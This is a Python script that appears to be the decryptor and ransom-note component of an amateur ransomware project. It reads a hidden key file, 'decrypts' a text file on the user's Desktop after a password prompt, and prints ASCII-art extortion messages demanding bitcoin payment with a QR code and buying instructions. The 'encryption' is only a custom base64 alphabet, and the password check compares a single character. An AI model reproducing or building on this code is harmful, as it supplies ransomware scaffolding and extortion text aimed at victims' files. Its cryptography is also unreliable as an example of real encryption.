import os
import argparse
import time

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
TYELLOW = '\033[33m'  # Red Text
ENDC = '\033[m'  # reset to the defaults

parser = argparse.ArgumentParser()
parser.add_argument('-i', action="store_true", help='about us')
parser.add_argument('-d', action="store_true", help='decrypte your files')
args = parser.parse_args()

key_file = open("/Users/" + os.getlogin() + "/Desktop/dossier/.key.txt", "r")
base64 = str(key_file.read())
def decode(mot):
    if len(mot) % 4 == 0:
        mot = mot.replace('=', '')
        car_list = [bin(base64.index(car)) for car in mot]
        list = [element[2:] for element in car_list]
        list = [element.zfill(6) for element in list]
        car_string = ''.join(list)
        car_string = car_string[:(len(car_string) - len(car_string) % 8)]
        car_bytes = int(car_string, base=2).to_bytes(len(car_string) // 8, 'big')
        return car_bytes.decode()
        pass
if args.d:
    print('\n                         :+shhhys+-\n                      :yMMMMMMMMMMMNy:\n                     `hMMMMNhsooshNMMMMh`\n                    `mMMMN+`      `+NMMMm`\n                    sMMMM-          -MMMMo\n                    hMMMm            NMMMh\n                 `..dMMMm............NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n                  ' + TRED + 'YOUR FILES ARE NOW CRYPTED\n             PLEASE ENTER THE PASSWORD DOWN BELLOW\n' + ENDC)
    file_save = open('/Users/' + os.getlogin() + '/Desktop/dossier/.pass.txt', 'r')
    realpass = str(file_save.read())
    file_save.close()
    password = input('password for decrypte your txt files: ')
    if password[0] == realpass[0]:
        file_txt = open('/Users/'+os.getlogin()+'/Desktop/dossier/test.txt', 'r')
        test = str(file_txt.read())
        test2 = ''.join(decode(test))
        file_txt = open('/Users/'+os.getlogin()+'/Desktop/dossier/test.txt', 'w+')
        file_txt.write(test2)
        file_txt.close()
        print('\n                          :+shhhys+-\n                        :yMMMMMMMMMMMNy:\n                      `hMMMMNhsooshNMMMMh`\n                     `mMMMN+`      `+NMMMm`\n                                    -MMMMo\n                                      NMMMh\n                 `....................NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n     ' + TGREEN + 'YOUR FILES ARE NOW UNCRYPTED, THANK YOU FOR THE BITCOINS\n  PLEASE GAVE US STARS ON TRUSTPILOT  (434 REVIEWS ' + TYELLOW + '★ ☆ ☆ ☆ ☆' + TGREEN + ' )!\n' + ENDC)
    else:
        print(TRED+'fail wrong password', ENDC)

if args.i:
    print(80*"=" + "\n           __    __       ___       ______  __  ___  _______  _______  \n          |  |  |  |     /   \     /      ||  |/  / |   ____||       \ \n          |  |__|  |    /  ^  \   |  ,---- |  `  /  |  |__   |  .--.  |\n          |   __   |   /  /_\  \  |  |     |    <   |   __|  |  |  |  |\n          |  |  |  |  /  _____  \ |  `----.|  .  \  |  |____ |  `--`  |\n          |__|  |__| /__/     \__\ \______||__|\__\ |_______||_______/ \n\n"+80*"=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been encrypted\n\n • For uncrypt your files you must send \n   100$ in btc to the adress below\n"+80*"=")
    time.sleep(3)
    print("\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              Please send 0.001 BTC\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              To this BTC adress by\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              If you don't know how\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               to get bitcoin? Go to\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              coinbase.com and sinup\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n"+80*"=")
